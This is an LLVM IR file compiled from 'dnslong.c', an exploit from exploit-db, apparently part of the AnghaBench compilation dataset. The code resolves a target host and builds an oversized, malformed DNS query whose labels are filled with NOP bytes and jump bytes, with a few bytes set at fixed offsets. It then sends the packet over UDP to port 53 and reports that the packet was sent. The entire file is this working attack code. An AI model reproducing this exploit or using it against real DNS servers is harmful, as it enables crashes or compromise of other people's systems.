; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19916.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19916.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i8*, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [44 x i8] c"dnslong.c by Hugo Breton (bretonh@pgci.ca)\0A\00", align 1
@.str.1 = private unnamed_addr constant [41 x i8] c"usage: %s host label_count label_length\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [17 x i8] c"unknown host %s\0A\00", align 1
@.str.3 = private unnamed_addr constant [35 x i8] c"resulting packet will be too long\0A\00", align 1
@SOCK_DGRAM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [29 x i8] c"unable to create UDP socket\0A\00", align 1
@.str.5 = private unnamed_addr constant [23 x i8] c"unable to send packet\0A\00", align 1
@.str.6 = private unnamed_addr constant [24 x i8] c"packet sent to host %s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [1024 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 8
  %15 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0))
  %17 = load i32, i32* %4, align 4
  %18 = icmp slt i32 %17, 4
  br i1 %18, label %19, label %24

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.1, i64 0, i64 0), i8* %22)
  store i32 0, i32* %3, align 4
  br label %177

24:                                               ; preds = %2
  %25 = bitcast %struct.sockaddr_in* %14 to i8*
  %26 = call i32 @bzero(i8* %25, i32 24)
  %27 = load i32, i32* @AF_INET, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  store i32 %27, i32* %28, align 8
  %29 = call i8* @htons(i32 53)
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i8* %29, i8** %30, align 8
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @inet_addr(i8* %33)
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  %36 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %35, i32 0, i32 0
  store i32 %34, i32* %36, align 8
  %37 = icmp eq i32 %34, -1
  br i1 %37, label %38, label %56

38:                                               ; preds = %24
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 1
  %41 = load i8*, i8** %40, align 8
  %42 = call %struct.hostent* @gethostbyname(i8* %41)
  store %struct.hostent* %42, %struct.hostent** %15, align 8
  %43 = icmp eq %struct.hostent* %42, null
  br i1 %43, label %44, label %49

44:                                               ; preds = %38
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 1
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0), i8* %47)
  store i32 0, i32* %3, align 4
  br label %177

49:                                               ; preds = %38
  %50 = load %struct.hostent*, %struct.hostent** %15, align 8
  %51 = getelementptr inbounds %struct.hostent, %struct.hostent* %50, i32 0, i32 0
  %52 = load i32, i32* %51, align 4
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  %54 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %53, i32 0, i32 0
  %55 = call i32 @bcopy(i32 %52, i32* %54, i32 4)
  br label %56

56:                                               ; preds = %49, %24
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 2
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @atoi(i8* %59)
  store i32 %60, i32* %12, align 4
  %61 = load i8**, i8*** %5, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 3
  %63 = load i8*, i8** %62, align 8
  %64 = call i32 @atoi(i8* %63)
  store i32 %64, i32* %13, align 4
  %65 = load i32, i32* %12, align 4
  %66 = load i32, i32* %13, align 4
  %67 = add nsw i32 %66, 1
  %68 = mul nsw i32 %65, %67
  %69 = add nsw i32 %68, 5
  %70 = add nsw i32 %69, 12
  store i32 %70, i32* %11, align 4
  %71 = load i32, i32* %11, align 4
  %72 = icmp sgt i32 %71, 1024
  br i1 %72, label %73, label %75

73:                                               ; preds = %56
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %177

75:                                               ; preds = %56
  %76 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %77 = call i32 @bzero(i8* %76, i32 1024)
  %78 = call i8* @htons(i32 -4442)
  %79 = ptrtoint i8* %78 to i16
  %80 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %81 = getelementptr inbounds i8, i8* %80, i64 0
  %82 = bitcast i8* %81 to i16*
  store i16 %79, i16* %82, align 2
  %83 = call i8* @htons(i32 1)
  %84 = ptrtoint i8* %83 to i16
  %85 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %86 = getelementptr inbounds i8, i8* %85, i64 4
  %87 = bitcast i8* %86 to i16*
  store i16 %84, i16* %87, align 2
  store i32 12, i32* %8, align 4
  store i32 0, i32* %9, align 4
  br label %88

88:                                               ; preds = %125, %75
  %89 = load i32, i32* %9, align 4
  %90 = load i32, i32* %12, align 4
  %91 = icmp slt i32 %89, %90
  br i1 %91, label %92, label %128

92:                                               ; preds = %88
  %93 = load i32, i32* %13, align 4
  %94 = trunc i32 %93 to i8
  %95 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %96 = load i32, i32* %8, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %8, align 4
  %98 = sext i32 %96 to i64
  %99 = getelementptr inbounds i8, i8* %95, i64 %98
  store i8 %94, i8* %99, align 1
  store i32 0, i32* %10, align 4
  br label %100

100:                                              ; preds = %109, %92
  %101 = load i32, i32* %10, align 4
  %102 = load i32, i32* %13, align 4
  %103 = icmp slt i32 %101, %102
  br i1 %103, label %104, label %114

104:                                              ; preds = %100
  %105 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %106 = load i32, i32* %8, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8, i8* %105, i64 %107
  store i8 -112, i8* %108, align 1
  br label %109

109:                                              ; preds = %104
  %110 = load i32, i32* %10, align 4
  %111 = add nsw i32 %110, 1
  store i32 %111, i32* %10, align 4
  %112 = load i32, i32* %8, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %8, align 4
  br label %100

114:                                              ; preds = %100
  %115 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %116 = load i32, i32* %8, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8, i8* %115, i64 %117
  %119 = getelementptr inbounds i8, i8* %118, i64 -2
  store i8 -21, i8* %119, align 1
  %120 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %121 = load i32, i32* %8, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = getelementptr inbounds i8, i8* %123, i64 -1
  store i8 -2, i8* %124, align 1
  br label %125

125:                                              ; preds = %114
  %126 = load i32, i32* %9, align 4
  %127 = add nsw i32 %126, 1
  store i32 %127, i32* %9, align 4
  br label %88

128:                                              ; preds = %88
  %129 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %130 = getelementptr inbounds i8, i8* %129, i64 269
  store i8 32, i8* %130, align 1
  %131 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %132 = getelementptr inbounds i8, i8* %131, i64 270
  store i8 -1, i8* %132, align 1
  %133 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %134 = getelementptr inbounds i8, i8* %133, i64 271
  store i8 -121, i8* %134, align 1
  %135 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %136 = getelementptr inbounds i8, i8* %135, i64 272
  store i8 1, i8* %136, align 1
  %137 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %138 = load i32, i32* %8, align 4
  %139 = add nsw i32 %138, 1
  store i32 %139, i32* %8, align 4
  %140 = sext i32 %138 to i64
  %141 = getelementptr inbounds i8, i8* %137, i64 %140
  store i8 0, i8* %141, align 1
  %142 = call i8* @htons(i32 1)
  %143 = ptrtoint i8* %142 to i16
  %144 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %145 = load i32, i32* %8, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds i8, i8* %144, i64 %146
  %148 = bitcast i8* %147 to i16*
  store i16 %143, i16* %148, align 2
  %149 = call i8* @htons(i32 1)
  %150 = ptrtoint i8* %149 to i16
  %151 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %152 = load i32, i32* %8, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds i8, i8* %151, i64 %153
  %155 = getelementptr inbounds i8, i8* %154, i64 2
  %156 = bitcast i8* %155 to i16*
  store i16 %150, i16* %156, align 2
  %157 = load i32, i32* @AF_INET, align 4
  %158 = load i32, i32* @SOCK_DGRAM, align 4
  %159 = call i32 @socket(i32 %157, i32 %158, i32 0)
  store i32 %159, i32* %7, align 4
  %160 = icmp eq i32 %159, -1
  br i1 %160, label %161, label %163

161:                                              ; preds = %128
  %162 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %177

163:                                              ; preds = %128
  %164 = load i32, i32* %7, align 4
  %165 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %166 = load i32, i32* %11, align 4
  %167 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %168 = call i32 @sendto(i32 %164, i8* %165, i32 %166, i32 0, %struct.sockaddr* %167, i32 24)
  %169 = icmp eq i32 %168, -1
  br i1 %169, label %170, label %172

170:                                              ; preds = %163
  %171 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %177

172:                                              ; preds = %163
  %173 = load i8**, i8*** %5, align 8
  %174 = getelementptr inbounds i8*, i8** %173, i64 1
  %175 = load i8*, i8** %174, align 8
  %176 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.6, i64 0, i64 0), i8* %175)
  store i32 0, i32* %3, align 4
  br label %177

177:                                              ; preds = %172, %170, %161, %73, %44, %19
  %178 = load i32, i32* %3, align 4
  ret i32 %178
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @bcopy(i32, i32*, i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
